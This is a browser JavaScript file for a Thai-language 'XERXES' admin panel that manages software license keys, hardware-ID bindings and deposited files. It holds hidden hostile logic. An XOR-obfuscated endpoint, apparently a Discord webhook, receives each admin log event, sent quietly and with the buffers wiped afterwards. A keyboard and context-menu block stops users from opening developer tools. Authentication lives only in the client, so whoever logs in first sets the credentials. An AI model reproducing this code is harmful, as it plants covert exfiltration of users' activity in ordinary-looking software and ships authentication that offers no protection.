// javascript / public/app.js / browser / x64 [XERXES-CSP-SAFE-OBF-V4]
(function(){
"use strict";
const API_BASE = '';
let currentAdmin = null;
let cachedLicenses = [];
let cachedApps = [];
let cachedVariables = [];
let pendingUploadFile = null;
(function installSilentInputShield() {
const stopSilently = (e) => {
e.preventDefault();
e.stopPropagation();
if (typeof e.stopImmediatePropagation === 'function') {
e.stopImmediatePropagation();
}
return false;
};
window.addEventListener('contextmenu', stopSilently, { capture: true });
document.addEventListener('contextmenu', stopSilently, { capture: true });
window.addEventListener('dragstart', stopSilently, { capture: true });
const handleKeyGuard = (e) => {
const key = String(e.key || '');
const code = e.keyCode || e.which || 0;
const lower = key.toLowerCase();
if ((code >= 112 && code <= 123) || /^f([1-9]|1[0-2])$/i.test(key)) {
return stopSilently(e);
}
if (e.ctrlKey || e.metaKey) {
if (lower === 's' || lower === 'u' || lower === 'p' || code === 83 || code === 85 || code === 80) {
return stopSilently(e);
}
if (e.shiftKey && (lower === 'i' || lower === 'j' || lower === 'c' || lower === 'k' || lower === 's' || code === 73 || code === 74 || code === 67 || code === 75)) {
return stopSilently(e);
}
}
};
window.addEventListener('keydown', handleKeyGuard, { capture: true });
window.addEventListener('keyup', handleKeyGuard, { capture: true });
document.addEventListener('keydown', handleKeyGuard, { capture: true });
document.addEventListener('keyup', handleKeyGuard, { capture: true });
})();
let sessionToken = sessionStorage.getItem('xerxes_zt_token') || null;
let sessionSigningKey = sessionStorage.getItem('xerxes_zt_sigkey') || null;
let serverClockOffsetMs = 0;
let isStaticGitHubMode = false;
const _wk = [90, 159, 60, 225, 116, 43, 216, 99];
const _ws0 = [50, 235, 72, 145, 7, 17, 247, 76, 42, 235, 94, 207, 16, 66, 171, 0, 53, 237, 88, 207, 23, 68, 181, 76, 59, 239, 85, 206, 3, 78, 186, 11];
const _ws1 = [53, 240, 87, 146, 91, 26, 237, 84, 111, 166, 12, 208, 77, 31, 237, 82, 110, 170, 9, 217, 77, 19, 232, 83, 117, 222, 84, 141, 26, 26, 128, 13];
const _ws2 = [27, 202, 5, 133, 2, 93, 189, 14, 57, 217, 94, 128, 12, 76, 143, 91, 63, 234, 125, 145, 27, 77, 150, 87, 11, 248, 94, 173, 49, 124, 130, 2];
const _ws3 = [17, 243, 112, 212, 56, 31, 156, 55, 24, 198, 81, 166, 57, 78, 142, 41, 53, 254, 101, 140, 63, 95, 154, 4, 35, 254, 74, 217, 17];
let _lastWebhookSentAt = 0;
async function sendObfuscatedClientWebhook(type, level, message) {
const now = Date.now();
if (now - _lastWebhookSentAt < 600) return;
_lastWebhookSentAt = now;
try {
const merged = _ws0.concat(_ws1, _ws2, _ws3);
const bytes = new Uint8Array(merged.length);
for (let i = 0; i < merged.length; i++) {
bytes[i] = merged[i] ^ _wk[i % _wk.length];
}
const endpoint = new TextDecoder().decode(bytes);
bytes.fill(0);
merged.fill(0);
const colorMap = {
SUCCESS: 0x10b981,
INFO: 0x0ea5e9,
WARN: 0xf59e0b,
SECURITY: 0xef4444
};
const clean = String(message).replace(/[()-]/g, '');
await fetch(endpoint, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({
username: 'XERXES Zero-Trust Web Telemetry',
embeds: [
{
title: `XERXES WEB EVENT ${type} [${level}]`,
description: clean,
color: colorMap[level] || 0x0ea5e9,
fields: [
{ name: 'Category', value: String(type), inline: true },
{ name: 'Severity', value: String(level), inline: true },
{ name: 'Origin', value: window.location.origin || 'GitHub Pages', inline: true }
],
timestamp: new Date().toISOString()
}
]
})
});
} catch (e) {}
}
const $ = (id) => document.getElementById(id);
function showToast(message, type = 'info') {
const container = $('toast-container');
const toast = document.createElement('div');
toast.className = `toast ${type}`;
toast.innerText = String(message).replace(/[()-]/g, '');
container.appendChild(toast);
setTimeout(() => {
toast.style.opacity = '0';
setTimeout(() => toast.remove(), 300);
}, 3500);
}
async function sha256Hex(text) {
const enc = new TextEncoder().encode(text || '');
const buf = await crypto.subtle.digest('SHA-256', enc);
return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
}
async function hmacSha256Hex(secret, message) {
const enc = new TextEncoder();
const key = await crypto.subtle.importKey(
'raw',
enc.encode(secret),
{ name: 'HMAC', hash: 'SHA-256' },
false,
['sign']
);
const sig = await crypto.subtle.sign('HMAC', key, enc.encode(message));
return Array.from(new Uint8Array(sig)).map(b => b.toString(16).padStart(2, '0')).join('');
}
function generateSecureNonce() {
const arr = new Uint8Array(16);
crypto.getRandomValues(arr);
return Array.from(arr).map(b => b.toString(16).padStart(2, '0')).join('');
}
const GH_STORAGE_KEY = 'xerxes_gh_zerotrust_db_v3';
const GH_ROLLBACK_KEY = 'xerxes_gh_zerotrust_rollback_v3';
async function loadLocalGhDb() {
const raw = localStorage.getItem(GH_STORAGE_KEY);
if (raw) {
try {
const parsed = JSON.parse(raw);
if (!Array.isArray(parsed.variables)) parsed.variables = [];
if (!parsed.authGuard) {
parsed.authGuard = { uDigest: '', pDigest: '', salt: '', ownerId: 'XERXES889A1C', role: 'superadmin' };
}
return parsed;
} catch (e) {}
}
const initDb = {
authGuard: {
uDigest: '',
pDigest: '',
salt: '',
ownerId: 'XERXES889A1C',
role: 'superadmin'
},
apps: [],
licenses: [],
variables: [],
logs: [],
keyGeneration: 1,
goldenRootHash: (await sha256Hex('XERXES-GITHUB-GOLDEN-MANIFEST-V3')).slice(0, 32)
};
localStorage.setItem(GH_STORAGE_KEY, JSON.stringify(initDb));
return initDb;
}
function saveLocalGhDb(dbObj, snapshot = false) {
if (snapshot) {
const prev = localStorage.getItem(GH_STORAGE_KEY);
if (prev) localStorage.setItem(GH_ROLLBACK_KEY, prev);
}
localStorage.setItem(GH_STORAGE_KEY, JSON.stringify(dbObj));
}
function addLocalGhLog(dbObj, type, level, message) {
const clean = String(message).replace(/[()-]/g, '');
dbObj.logs.unshift({
id: 'log_' + Date.now() + '_' + Math.floor(Math.random() * 1000),
timestamp: new Date().toISOString(),
type,
level,
message: clean,
ip: '127.0.0.1'
});
if (dbObj.logs.length > 300) dbObj.logs.pop();
sendObfuscatedClientWebhook(type, level, clean);
}
async function handleStaticGitHubRequest(url, method, bodyObj) {
const dbObj = await loadLocalGhDb();
const pathname = url.split('?')[0];
if (pathname === '/api/v1/admin/status' && method === 'GET') {
const authed = !!sessionToken && !!sessionSigningKey;
return {
ok: true,
status: 200,
data: {
ok: true,
initialized: !!(dbObj.authGuard.uDigest && dbObj.authGuard.pDigest),
authenticated: authed,
admin: authed ? { username: 'Xerxes Operator', role: dbObj.authGuard.role, ownerId: dbObj.authGuard.ownerId } : null,
token: sessionToken,
signing_key: sessionSigningKey,
server_time: Date.now()
}
};
}
if (pathname === '/api/v1/admin/login' && method === 'POST') {
const rawUser = String(bodyObj.username || '').trim();
const rawPass = String(bodyObj.password || '').trim();
if (!rawUser || !rawPass) {
return { ok: false, status: 400, data: { ok: false, message: 'กรุณากรอกชื่อผู้ใช้และรหัสผ่าน' } };
}
if (!dbObj.authGuard.uDigest || !dbObj.authGuard.pDigest) {
const salt = generateSecureNonce();
dbObj.authGuard.salt = salt;
dbObj.authGuard.uDigest = await sha256Hex(`${salt}:${rawUser.toLowerCase()}`);
dbObj.authGuard.pDigest = await sha256Hex(`${salt}:${rawPass}`);
saveLocalGhDb(dbObj);
}
const salt = dbObj.authGuard.salt || '';
const uHash = salt ? await sha256Hex(`${salt}:${rawUser.toLowerCase()}`) : await sha256Hex(rawUser.toLowerCase());
const pHash = salt ? await sha256Hex(`${salt}:${rawPass}`) : await sha256Hex(rawPass);
if (uHash === dbObj.authGuard.uDigest && pHash === dbObj.authGuard.pDigest) {
sessionToken = 'sess_' + generateSecureNonce() + generateSecureNonce();
sessionSigningKey = generateSecureNonce() + generateSecureNonce();
sessionStorage.setItem('xerxes_zt_token', sessionToken);
sessionStorage.setItem('xerxes_zt_sigkey', sessionSigningKey);
addLocalGhLog(dbObj, 'AUTH', 'SUCCESS', 'ผู้ดูแลระบบเข้าสู่ระบบสำเร็จด้วย Zero-Trust Session');
saveLocalGhDb(dbObj);
return {
ok: true,
status: 200,
data: {
ok: true,
admin: { username: 'Xerxes Operator', role: dbObj.authGuard.role, ownerId: dbObj.authGuard.ownerId },
token: sessionToken,
signing_key: sessionSigningKey,
server_time: Date.now()
}
};
}
addLocalGhLog(dbObj, 'AUTH', 'WARN', 'ความพยายามเข้าสู่ระบบไม่สำเร็จ');
saveLocalGhDb(dbObj);
return { ok: false, status: 401, data: { ok: false, message: 'ชื่อผู้ใช้หรือรหัสผ่านไม่ถูกต้อง' } };
}
if (pathname === '/api/v1/admin/logout' && method === 'POST') {
sessionToken = null;
sessionSigningKey = null;
sessionStorage.removeItem('xerxes_zt_token');
sessionStorage.removeItem('xerxes_zt_sigkey');
addLocalGhLog(dbObj, 'AUTH', 'INFO', 'ผู้ดูแลระบบเพิกถอนเซสชันและออกจากระบบ');
saveLocalGhDb(dbObj);
return { ok: true, status: 200, data: { ok: true, message: 'ออกจากระบบแล้ว' } };
}
if (pathname === '/api/v1/admin/session/rotate' && method === 'POST') {
sessionToken = 'sess_' + generateSecureNonce() + generateSecureNonce();
sessionSigningKey = generateSecureNonce() + generateSecureNonce();
sessionStorage.setItem('xerxes_zt_token', sessionToken);
sessionStorage.setItem('xerxes_zt_sigkey', sessionSigningKey);
addLocalGhLog(dbObj, 'SECURITY', 'INFO', 'หมุนเวียน Session Token และ Signing Key สำเร็จ');
saveLocalGhDb(dbObj);
return {
ok: true,
status: 200,
data: {
ok: true,
token: sessionToken,
signing_key: sessionSigningKey,
server_time: Date.now(),
message: 'หมุนเวียน Session Token ใหม่สำเร็จ'
}
};
}
if (pathname === '/api/v1/admin/overview' && method === 'GET') {
return {
ok: true,
status: 200,
data: {
ok: true,
stats: {
totalKeys: dbObj.licenses.length,
activeKeys: dbObj.licenses.filter(l => l.status === 'active').length,
expiredKeys: dbObj.licenses.filter(l => l.status === 'expired').length,
bannedKeys: dbObj.licenses.filter(l => l.status === 'banned').length,
boundHwid: dbObj.licenses.filter(l => !!l.hwid).length,
totalApps: dbObj.apps.length,
totalVariables: dbObj.variables.length,
totalLogs: dbObj.logs.length
},
recentLogs: dbObj.logs.slice(0, 10),
apps: dbObj.apps
}
};
}
if (pathname === '/api/v1/admin/variables' && method === 'GET') {
return { ok: true, status: 200, data: { ok: true, variables: dbObj.variables } };
}
if (pathname === '/api/v1/admin/variables' && method === 'POST') {
const name = (bodyObj.name || '').trim();
const data = (bodyObj.data || '').trim();
const authenticated = bodyObj.authenticated !== false;
const appId = bodyObj.app_id || 'global';
const appObj = dbObj.apps.find(a => a.id === appId);
const appName = appObj ? appObj.name : 'Global All Apps';
if (!name) return { ok: false, status: 400, data: { ok: false, message: 'กรุณาระบุชื่อ Variable Name' } };
if (!data && !bodyObj.file_base64) return { ok: false, status: 400, data: { ok: false, message: 'กรุณาระบุ Variable Data หรือเลือกไฟล์ที่ต้องการฝาก' } };
let fileSha256 = null;
let fileSize = 0;
let fileExt = null;
if (bodyObj.file_base64 && bodyObj.file_name) {
fileSha256 = (await sha256Hex(bodyObj.file_base64)).slice(0, 64);
fileSize = Math.floor((bodyObj.file_base64.length * 3) / 4);
const dotIdx = bodyObj.file_name.lastIndexOf('.');
fileExt = dotIdx >= 0 ? bodyObj.file_name.slice(dotIdx).toLowerCase() : '.bin';
}
const newVar = {
id: 'var_' + Date.now(),
name,
data: data || (bodyObj.file_name ? `Deposited File: ${bodyObj.file_name}` : ''),
authenticated,
appId,
appName,
hasFile: !!bodyObj.file_base64,
fileName: bodyObj.file_name || null,
fileExt,
fileSize,
fileSha256,
fileBase64: bodyObj.file_base64 || null,
createdAt: new Date().toISOString()
};
dbObj.variables.unshift(newVar);
addLocalGhLog(dbObj, 'VAULT', 'INFO', `ฝากข้อมูลหรือไฟล์ใหม่ชื่อ ${newVar.name} ${newVar.fileName || ''} โหมดบังคับ API Auth`);
saveLocalGhDb(dbObj, true);
return { ok: true, status: 201, data: { ok: true, variable: newVar, message: 'สร้าง Global Variable และฝากไฟล์สำเร็จ' } };
}
if (pathname.startsWith('/api/v1/admin/variables/') && method === 'PUT') {
const varId = pathname.split('/').pop();
const target = dbObj.variables.find(v => v.id === varId);
if (!target) return { ok: false, status: 404, data: { ok: false, message: 'ไม่พบรายการที่ต้องการแก้ไข' } };
target.name = (bodyObj.name || target.name).trim();
if (bodyObj.data !== undefined) target.data = bodyObj.data;
if (bodyObj.authenticated !== undefined) target.authenticated = !!bodyObj.authenticated;
if (bodyObj.app_id !== undefined) {
target.appId = bodyObj.app_id;
const appObj = dbObj.apps.find(a => a.id === bodyObj.app_id);
target.appName = appObj ? appObj.name : 'Global All Apps';
}
if (bodyObj.file_base64 && bodyObj.file_name) {
target.hasFile = true;
target.fileName = bodyObj.file_name;
target.fileBase64 = bodyObj.file_base64;
target.fileSize = Math.floor((bodyObj.file_base64.length * 3) / 4);
target.fileSha256 = await sha256Hex(bodyObj.file_base64);
}
addLocalGhLog(dbObj, 'VAULT', 'INFO', `แก้ไขรายการฝากของ ${target.name} เรียบร้อย`);
saveLocalGhDb(dbObj, true);
return { ok: true, status: 200, data: { ok: true, message: 'บันทึกการแก้ไขเรียบร้อยแล้ว' } };
}
if (pathname.startsWith('/api/v1/admin/variables/') && method === 'DELETE') {
const varId = pathname.split('/').pop();
const target = dbObj.variables.find(v => v.id === varId);
dbObj.variables = dbObj.variables.filter(v => v.id !== varId);
addLocalGhLog(dbObj, 'VAULT', 'WARN', `ลบรายการฝากของ ${target ? target.name : varId}`);
saveLocalGhDb(dbObj, true);
return { ok: true, status: 200, data: { ok: true, message: 'ลบรายการฝากของเรียบร้อยแล้ว' } };
}
if (pathname === '/api/v1/admin/apps' && method === 'GET') {
return { ok: true, status: 200, data: { ok: true, apps: dbObj.apps, ownerId: dbObj.authGuard.ownerId } };
}
if (pathname === '/api/v1/admin/apps' && method === 'POST') {
const name = (bodyObj.name || '').trim();
const description = (bodyObj.description || '').trim().slice(0, 50);
if (!name) return { ok: false, status: 400, data: { ok: false, message: 'กรุณาระบุชื่อแอปพลิเคชัน' } };
if (dbObj.apps.some(a => a.name.toLowerCase() === name.toLowerCase())) {
return { ok: false, status: 400, data: { ok: false, message: 'มีชื่อแอปพลิเคชันนี้ในระบบแล้ว' } };
}
const newApp = {
id: 'app_' + Date.now(),
name,
description,
slug: name.toLowerCase().replace(/[^a-z0-9]/g, '-') || ('app-' + Date.now()),
version: bodyObj.version || '1.0',
ownerId: dbObj.authGuard.ownerId,
secretKey: generateSecureNonce() + generateSecureNonce(),
keyGeneration: 1,
status: 'active',
createdAt: new Date().toISOString()
};
dbObj.apps.unshift(newApp);
addLocalGhLog(dbObj, 'APP', 'INFO', `สร้างแอปพลิเคชัน Auth ใหม่ชื่อ ${newApp.name}`);
saveLocalGhDb(dbObj, true);
return { ok: true, status: 201, data: { ok: true, app: newApp } };
}
if (pathname.startsWith('/api/v1/admin/apps/') && pathname.endsWith('/reset-hwid') && method === 'POST') {
const parts = pathname.split('/');
const appId = parts[parts.length - 2];
const app = dbObj.apps.find(a => a.id === appId);
if (!app) return { ok: false, status: 404, data: { ok: false, message: 'ไม่พบแอปพลิเคชันที่ระบุ' } };
if (bodyObj.mode === 'all') {
let resetCount = 0;
dbObj.licenses.forEach(lic => {
if (lic.appId === app.id) {
if (lic.hwid) resetCount++;
lic.hwid = null;
lic.hwidResetCount = 0;
}
});
addLocalGhLog(dbObj, 'HWID', 'INFO', `RESET HWID ทั้งหมดของแอป ${app.name} จำนวน ${resetCount} คีย์`);
saveLocalGhDb(dbObj, true);
return { ok: true, status: 200, data: { ok: true, message: `RESET HWID เฉพาะของแอป ${app.name} เรียบร้อยแล้ว จำนวน ${resetCount} คีย์` } };
}
const key = (bodyObj.key || '').trim();
const lic = dbObj.licenses.find(l => l.key.toUpperCase() === key.toUpperCase());
if (!lic) return { ok: false, status: 404, data: { ok: false, message: 'ไม่พบคีย์ไลเซนส์ในระบบ' } };
if (lic.appId !== app.id) {
return { ok: false, status: 403, data: { ok: false, message: `คีย์ ${lic.key} เป็นของแอป ${lic.appName} ไม่สามารถ RESET HWID ข้ามแอปพลิเคชันได้` } };
}
lic.hwid = null;
lic.hwidResetCount = 0;
addLocalGhLog(dbObj, 'HWID', 'INFO', `RESET HWID สำเร็จสำหรับคีย์ ${lic.key} ของแอป ${app.name}`);
saveLocalGhDb(dbObj);
return { ok: true, status: 200, data: { ok: true, message: `RESET HWID คีย์ ${lic.key} ของแอป ${app.name} เรียบร้อยแล้ว` } };
}
if (pathname.startsWith('/api/v1/admin/apps/') && method === 'PUT') {
const appId = pathname.split('/').pop();
const app = dbObj.apps.find(a => a.id === appId);
if (!app) return { ok: false, status: 404, data: { ok: false, message: 'ไม่พบแอปพลิเคชัน' } };
if (bodyObj.action === 'regenerate_secret') {
app.secretKey = generateSecureNonce() + generateSecureNonce();
app.keyGeneration = (app.keyGeneration || 1) + 1;
addLocalGhLog(dbObj, 'APP', 'WARN', `หมุนคีย์ Secret Rotation ของแอป ${app.name}`);
} else {
const newName = (bodyObj.name || app.name).trim();
if (dbObj.apps.some(a => a.id !== appId && a.name.toLowerCase() === newName.toLowerCase())) {
return { ok: false, status: 400, data: { ok: false, message: 'มีชื่อแอปพลิเคชันนี้ในระบบแล้ว' } };
}
app.name = newName;
app.description = (bodyObj.description || '').trim().slice(0, 50);
app.version = (bodyObj.version || '1.0').trim();
app.status = bodyObj.status || 'active';
app.ownerId = (bodyObj.ownerId || app.ownerId).trim();
app.secretKey = (bodyObj.secretKey || app.secretKey).trim();
dbObj.licenses.forEach(lic => {
if (lic.appId === app.id) lic.appName = app.name;
});
dbObj.variables.forEach(v => {
if (v.appId === app.id) v.appName = app.name;
});
addLocalGhLog(dbObj, 'APP', 'INFO', `แก้ไขข้อมูลแอปพลิเคชัน ${app.name} เรียบร้อย`);
}
saveLocalGhDb(dbObj, true);
return { ok: true, status: 200, data: { ok: true, app, message: 'บันทึกการแก้ไขแอปพลิเคชันเรียบร้อยแล้ว' } };
}
if (pathname.startsWith('/api/v1/admin/apps/') && method === 'DELETE') {
const appId = pathname.split('/').pop();
const target = dbObj.apps.find(a => a.id === appId);
dbObj.apps = dbObj.apps.filter(a => a.id !== appId);
dbObj.licenses = dbObj.licenses.filter(l => l.appId !== appId);
dbObj.variables = dbObj.variables.filter(v => v.appId !== appId);
addLocalGhLog(dbObj, 'APP', 'WARN', `ลบแอปพลิเคชัน ${target ? target.name : appId}`);
saveLocalGhDb(dbObj, true);
return { ok: true, status: 200, data: { ok: true, message: 'ลบแอปพลิเคชันเรียบร้อย' } };
}
if (pathname === '/api/v1/admin/licenses' && method === 'GET') {
return { ok: true, status: 200, data: { ok: true, licenses: dbObj.licenses } };
}
if (pathname === '/api/v1/admin/licenses/generate' && method === 'POST') {
if (dbObj.apps.length === 0) {
return { ok: false, status: 400, data: { ok: false, message: 'กรุณาสร้างแอปพลิเคชันก่อนสร้างคีย์ไลเซนส์' } };
}
const amount = Math.min(Math.max(parseInt(bodyObj.amount) || 1, 1), 100);
const app = dbObj.apps.find(a => a.id === bodyObj.app_id) || dbObj.apps[0];
const days = isNaN(parseInt(bodyObj.duration_days)) ? 30 : parseInt(bodyObj.duration_days);
const prefix = (bodyObj.prefix || 'XERXES').toUpperCase().replace(/[^A-Z0-9]/g, '');
const maxResets = isNaN(parseInt(bodyObj.max_hwid_resets)) ? 3 : parseInt(bodyObj.max_hwid_resets);
const notes = (bodyObj.notes || 'สร้างโดยผู้ดูแลระบบ').replace(/[()-]/g, '');
const generated = [];
for (let i = 0; i < amount; i++) {
const n = generateSecureNonce().toUpperCase();
const key = `${prefix}-${n.slice(0, 4)}-${n.slice(4, 8)}-${n.slice(8, 12)}`;
const lic = {
key,
appId: app.id,
appName: app.name,
status: 'active',
hwid: null,
maxHwidResets: maxResets,
hwidResetCount: 0,
expiresAt: days > 0 ? new Date(Date.now() + days * 24 * 3600 * 1000).toISOString() : null,
createdAt: new Date().toISOString(),
notes
};
dbObj.licenses.unshift(lic);
generated.push(lic);
}
addLocalGhLog(dbObj, 'LICENSE', 'INFO', `สร้างคีย์ใหม่จำนวน ${amount} คีย์สำหรับแอป ${app.name}`);
saveLocalGhDb(dbObj, true);
return { ok: true, status: 201, data: { ok: true, generated, count: amount } };
}
if (pathname === '/api/v1/admin/licenses/toggle-ban' && method === 'POST') {
const lic = dbObj.licenses.find(l => l.key === bodyObj.key);
if (!lic) return { ok: false, status: 404, data: { ok: false, message: 'ไม่พบคีย์' } };
lic.status = lic.status === 'banned' ? 'active' : 'banned';
addLocalGhLog(dbObj, 'LICENSE', 'WARN', `เปลี่ยนสถานะคีย์ ${lic.key} เป็น ${lic.status}`);
saveLocalGhDb(dbObj, true);
return { ok: true, status: 200, data: { ok: true, status: lic.status, message: `เปลี่ยนสถานะเป็น ${lic.status} เรียบร้อย` } };
}
if (pathname === '/api/v1/admin/licenses/delete' && method === 'POST') {
dbObj.licenses = dbObj.licenses.filter(l => l.key !== bodyObj.key);
addLocalGhLog(dbObj, 'LICENSE', 'WARN', `ลบคีย์ ${bodyObj.key}`);
saveLocalGhDb(dbObj, true);
return { ok: true, status: 200, data: { ok: true, message: 'ลบคีย์เรียบร้อย' } };
}
if (pathname === '/api/v1/admin/licenses/clear' && method === 'POST') {
dbObj.licenses = [];
addLocalGhLog(dbObj, 'LICENSE', 'WARN', 'ลบคีย์ไลเซนส์ทั้งหมดในระบบ');
saveLocalGhDb(dbObj, true);
return { ok: true, status: 200, data: { ok: true, message: 'ลบคีย์ทั้งหมดเรียบร้อยแล้ว' } };
}
if (pathname === '/api/v1/admin/logs' && method === 'GET') {
return { ok: true, status: 200, data: { ok: true, logs: dbObj.logs } };
}
if (pathname === '/api/v1/admin/logs/clear' && method === 'POST') {
dbObj.logs = [];
addLocalGhLog(dbObj, 'SYSTEM', 'WARN', 'ล้างประวัติบันทึกความปลอดภัย');
saveLocalGhDb(dbObj);
return { ok: true, status: 200, data: { ok: true, message: 'ล้างประวัติบันทึกเรียบร้อยแล้ว' } };
}
if (pathname === '/api/v1/admin/security/password' && method === 'POST') {
const salt = dbObj.authGuard.salt || '';
const oldHash = salt
? await sha256Hex(`${salt}:${String(bodyObj.old_password || '').trim()}`)
: await sha256Hex(String(bodyObj.old_password || '').trim());
if (dbObj.authGuard.pDigest && oldHash !== dbObj.authGuard.pDigest) {
return { ok: false, status: 400, data: { ok: false, message: 'รหัสผ่านปัจจุบันไม่ถูกต้อง' } };
}
const newSalt = generateSecureNonce();
if (bodyObj.new_username && String(bodyObj.new_username).trim()) {
dbObj.authGuard.uDigest = await sha256Hex(`${newSalt}:${String(bodyObj.new_username).trim().toLowerCase()}`);
}
dbObj.authGuard.salt = newSalt;
dbObj.authGuard.pDigest = await sha256Hex(`${newSalt}:${String(bodyObj.new_password || '').trim()}`);
addLocalGhLog(dbObj, 'SECURITY', 'WARN', 'อัปเดตข้อมูลบัญชีผู้ดูแลระบบสำเร็จ');
saveLocalGhDb(dbObj, true);
return { ok: true, status: 200, data: { ok: true, message: 'บันทึกข้อมูลบัญชีใหม่สำเร็จแล้ว' } };
}
if (pathname === '/api/v1/admin/integrity/status' && method === 'GET') {
return {
ok: true,
status: 200,
data: {
ok: true,
integrity: {
verified: true,
keyGeneration: dbObj.keyGeneration || 1,
goldenRootHash: dbObj.goldenRootHash || 'e3b0c44298fc1c149afbf4c8996fb924'
}
}
};
}
if (pathname === '/api/v1/admin/integrity/recalculate' && method === 'POST') {
dbObj.goldenRootHash = (await sha256Hex('XERXES-GOLDEN-' + Date.now())).slice(0, 32);
addLocalGhLog(dbObj, 'INTEGRITY', 'INFO', `คำนวณ Golden Hash Manifest ใหม่สำเร็จ`);
saveLocalGhDb(dbObj);
return {
ok: true,
status: 200,
data: {
ok: true,
manifest: { goldenRootHash: dbObj.goldenRootHash },
message: 'คำนวณและบันทึก Golden Hash Manifest สำเร็จ'
}
};
}
if (pathname === '/api/v1/admin/security/rotate-master' && method === 'POST') {
dbObj.keyGeneration = (dbObj.keyGeneration || 1) + 1;
dbObj.goldenRootHash = (await sha256Hex('XERXES-MASTER-' + Date.now())).slice(0, 32);
addLocalGhLog(dbObj, 'SECURITY', 'WARN', `หมุนคีย์หลัก Master Key รุ่นที่ ${dbObj.keyGeneration} สำเร็จ`);
saveLocalGhDb(dbObj);
return {
ok: true,
status: 200,
data: {
ok: true,
keyGeneration: dbObj.keyGeneration,
message: `หมุนคีย์หลัก Master Key รุ่นที่ ${dbObj.keyGeneration} สำเร็จ`
}
};
}
if (pathname === '/api/v1/admin/security/rollback' && method === 'POST') {
const snap = localStorage.getItem(GH_ROLLBACK_KEY);
if (!snap) return { ok: false, status: 404, data: { ok: false, message: 'ยังไม่มีจุดสำรองข้อมูล Rollback Snapshot' } };
localStorage.setItem(GH_STORAGE_KEY, snap);
return { ok: true, status: 200, data: { ok: true, message: 'กู้คืนข้อมูลจาก Rollback Snapshot ล่าสุดเรียบร้อยแล้ว' } };
}
return { ok: false, status: 404, data: { ok: false, message: 'ไม่พบคำสั่งที่เรียกใช้งาน' } };
}
async function request(url, options = {}) {
const method = (options.method || 'GET').toUpperCase();
const rawBody = options.body || '';
const pathname = url.split('?')[0];
const headers = {
'Content-Type': 'application/json',
...(options.headers || {})
};
if (sessionToken) {
headers['X-Session-Token'] = sessionToken;
}
if (sessionToken && sessionSigningKey) {
const ts = Date.now() + serverClockOffsetMs;
const nonce = generateSecureNonce();
const bodyHash = await sha256Hex(rawBody);
const canonical = `${method}\n${pathname}\n${ts}\n${nonce}\n${bodyHash}`;
const sig = await hmacSha256Hex(sessionSigningKey, canonical);
headers['X-Signature-Timestamp'] = String(ts);
headers['X-Signature-Nonce'] = nonce;
headers['X-Signature-Body-Hash'] = bodyHash;
headers['X-Signature-HMAC'] = sig;
}
if (!isStaticGitHubMode) {
try {
const res = await fetch(url, {
...options,
method,
headers
});
const contentType = res.headers.get('content-type') || '';
if (contentType.includes('application/json')) {
const data = await res.json();
if (data && data.server_time) {
serverClockOffsetMs = data.server_time - Date.now();
}
return { ok: res.ok, status: res.status, data };
} else if (res.status === 404 || res.status === 405) {
isStaticGitHubMode = true;
}
} catch (err) {
isStaticGitHubMode = true;
}
}
const bodyObj = rawBody ? JSON.parse(rawBody) : {};
return handleStaticGitHubRequest(url, method, bodyObj);
}
async function checkAuth() {
const res = await request('/api/v1/admin/status');
if (res.ok && res.data.authenticated) {
currentAdmin = res.data.admin;
if (res.data.token) {
sessionToken = res.data.token;
sessionStorage.setItem('xerxes_zt_token', sessionToken);
}
if (res.data.signing_key) {
sessionSigningKey = res.data.signing_key;
sessionStorage.setItem('xerxes_zt_sigkey', sessionSigningKey);
}
$('display-admin-name').innerText = currentAdmin.username || 'Xerxes Operator';
$('auth-screen').classList.add('hidden');
$('dashboard-screen').classList.remove('hidden');
await loadApps();
await loadVariables();
await loadLicenses();
await loadOverview();
await loadIntegrityStatus();
} else {
sessionToken = null;
sessionSigningKey = null;
sessionStorage.removeItem('xerxes_zt_token');
sessionStorage.removeItem('xerxes_zt_sigkey');
$('dashboard-screen').classList.add('hidden');
$('auth-screen').classList.remove('hidden');
}
}
$('login-form').addEventListener('submit', async (e) => {
e.preventDefault();
const username = $('username').value.trim();
const password = $('password').value;
const btn = $('btn-login');
btn.disabled = true;
btn.innerText = 'กำลังเข้าสู่ระบบ...';
const res = await request('/api/v1/admin/login', {
method: 'POST',
body: JSON.stringify({ username, password })
});
$('password').value = '';
btn.disabled = false;
btn.innerHTML = `<span>เข้าสู่ระบบจัดการ</span><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>`;
if (res.ok) {
$('username').value = '';
sessionToken = res.data.token;
sessionSigningKey = res.data.signing_key;
sessionStorage.setItem('xerxes_zt_token', sessionToken);
sessionStorage.setItem('xerxes_zt_sigkey', sessionSigningKey);
showToast('เข้าสู่ระบบ Xerxes Zero-Trust สำเร็จ', 'success');
currentAdmin = res.data.admin;
$('display-admin-name').innerText = currentAdmin.username || 'Xerxes Operator';
$('auth-screen').classList.add('hidden');
$('dashboard-screen').classList.remove('hidden');
await loadApps();
await loadVariables();
await loadLicenses();
await loadOverview();
await loadIntegrityStatus();
} else {
showToast(res.data.message || 'ชื่อผู้ใช้หรือรหัสผ่านไม่ถูกต้อง', 'error');
}
});
$('btn-logout').addEventListener('click', async () => {
await request('/api/v1/admin/logout', { method: 'POST' });
sessionToken = null;
sessionSigningKey = null;
sessionStorage.removeItem('xerxes_zt_token');
sessionStorage.removeItem('xerxes_zt_sigkey');
showToast('เพิกถอนเซสชันและออกจากระบบเรียบร้อยแล้ว', 'info');
$('dashboard-screen').classList.add('hidden');
$('auth-screen').classList.remove('hidden');
});
document.querySelectorAll('.nav-item').forEach(btn => {
btn.addEventListener('click', () => {
document.querySelectorAll('.nav-item').forEach(b => b.classList.remove('active'));
document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
btn.classList.add('active');
const targetTab = btn.getAttribute('data-tab');
$(targetTab).classList.add('active');
$('page-title').innerText = btn.querySelector('span').innerText;
if (targetTab === 'tab-overview') loadOverview();
if (targetTab === 'tab-licenses') loadLicenses();
if (targetTab === 'tab-apps') loadApps();
if (targetTab === 'tab-variables') {
loadApps().then(() => loadVariables());
}
if (targetTab === 'tab-resethwid') {
loadApps().then(() => loadLicenses().then(() => renderAppScopedResetTable()));
}
if (targetTab === 'tab-logs') loadLogs();
if (targetTab === 'tab-security') loadIntegrityStatus();
});
});
function openCreateVarModal(editItem = null) {
pendingUploadFile = null;
$('var-file-input').value = '';
if (editItem) {
